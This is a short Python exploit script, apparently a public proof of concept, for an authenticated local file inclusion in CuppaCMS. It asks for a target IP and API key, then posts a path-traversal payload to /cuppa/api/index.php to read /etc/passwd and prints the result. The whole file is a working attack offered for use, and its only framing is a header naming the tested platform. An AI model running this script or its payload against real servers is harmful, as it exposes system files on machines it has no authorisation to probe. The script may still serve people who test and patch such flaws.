#!/usr/bin/env python3

# Vulnerable Application: CuppaCMS.
# Vulnerablity Name: Authenticated Local File Inclusion.
# Testing Date: 22/01/2022
# Testing Platform: Debian 10 + APACHE2 + PHP/7.3
# Exploit Author: Mohd. Badrudduja

import requests

# proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def cuppa_lfi():
    ip = input("Enter traget IP: ")
    # port = input("Enter target port: ")
    uri = "/cuppa/api/index.php"
    url = ('http://' + ip + uri)
    print("[+] Traget URL to test: " + url)
    
    key = input("Enter api-key: ")
    
    headers = {'key': key}
    data = {'function': './../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd/'}
    r = requests.post(url=url, headers=headers, data=data, verify=False)
    res = r.text
    
    if "root" in res:
        print('[+] Target is vulnerable to LFI. \n\n' + res)
    else:
        print("[-] Something goes wrong.")

cuppa_lfi()
